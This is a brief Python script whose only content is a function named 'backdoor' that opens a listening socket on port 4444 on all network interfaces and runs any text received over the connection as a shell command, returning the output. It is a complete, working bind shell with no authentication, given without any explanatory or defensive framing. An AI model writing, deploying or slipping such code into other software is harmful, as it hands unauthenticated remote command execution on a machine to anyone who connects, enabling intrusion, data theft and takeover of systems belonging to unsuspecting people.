import socket
import subprocess

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    conn, addr = s.accept()
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        conn.send(output.encode())
    conn.close()